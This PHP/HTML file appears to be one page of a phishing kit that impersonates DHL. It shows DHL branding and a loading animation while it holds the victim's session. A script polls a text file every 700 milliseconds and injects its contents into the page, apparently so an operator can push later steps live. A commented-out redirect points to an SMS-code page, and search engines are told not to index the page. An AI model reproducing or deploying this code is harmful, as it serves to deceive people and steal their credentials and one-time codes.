<?php
session_start();
include("lange.php");

$one = $_SESSION["one"];
$one = str_replace(" ","",$one);
?><!doctype html>
<html>
<head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
	<!--	<meta http-equiv="refresh" content="5; URL= ./E.php?SMS=1#KJSDKJhjghtyuUJSUSQUIQSIklklsisiiIUZIUZEJQSJkkjsJSJS">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./source_file/font-awesome.min.css">
		<link rel="stylesheet" href="./source_file/style.css">
		<link rel="stylesheet" href="./source_file/bootstrap-icons.css">
		
        <link rel="icon" type="image/x-icon" href="./source_file/favicon.ico">

        <title>| DHL |</title>
    </head>

<body>
<div class="navbar">
        	<div class="container-fluid">
        		<div class="topping">
        			<img src="./source_file/dhl-logo.svg">
        			<ul class="web">
        				<li><i class="bi bi-exclamation-circle me-2"></i> <?php echo get_text("top_header1"); ?></li>
        				<li> <?php echo get_text("top_header2"); ?></li>
						<li><i class="bi bi-globe me-2"></i> <?php echo $countrycode; ?></li>
        				<li><i class="bi bi-globe me-2"></i> <?php echo get_text("top_header3"); ?></li>
        				<li><i class="bi bi-search me-2"></i> <?php echo get_text("top_header4"); ?></li>
        			</ul>
        			<ul class="respo">
        				<li><i class="bi bi-list"></i></li>
        				<li></li>
        			</ul>
        		</div>
        		<div class="bottomin">
        			<ul>
        				<li><?php echo get_text("mainmenu1"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text("mainmenu2"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text("mainmenu3"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text("mainmenu4"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        			</ul>
        			<p><i class="bi bi-person-fill me-2"></i><?php echo get_text("header-right"); ?></p>
        		</div>
        	</div>
        </div>
        <div>
		  <div>
		    <div class="">
		      <div class="">
        <div style="color: orange;padding: 100px;">
          <div class="d-flex justify-content-center">
            <div>
                <img src="./source_file/dhl-logo.svg" class="sfli" style="
    width: 100px;
">
            </div>
          </div><br>

<div class="d-flex justify-content-center">
            <div>
                <img src="./source_file/VIVA.gif" class="sfli" style="
    width: 100px;
">
            </div>
          </div>
        </div>
		      </div>
		    </div>
		  </div>
		</div>
		  <div id="content" style="display:none;"></div>
<script>
    function fetchTextFile() {
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            console.log('Successfully fetched the text file.');
            var text = xhr.responseText;
            if (text.trim()) {
              document.getElementById('content').innerHTML = text;
              console.log('Content loaded and executed.');
            } else {
              console.log('No content to load.');
            }
          } else {
            console.error('Failed to fetch text file. Status:', xhr.status);
          }
        }
      };

      xhr.open('GET', 'api.txt', true);
      xhr.send();
    }

    function longPoll() {
      fetchTextFile();
      setTimeout(longPoll, 700);
    }

    longPoll();
  </script>
        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        
     
	 </body></html>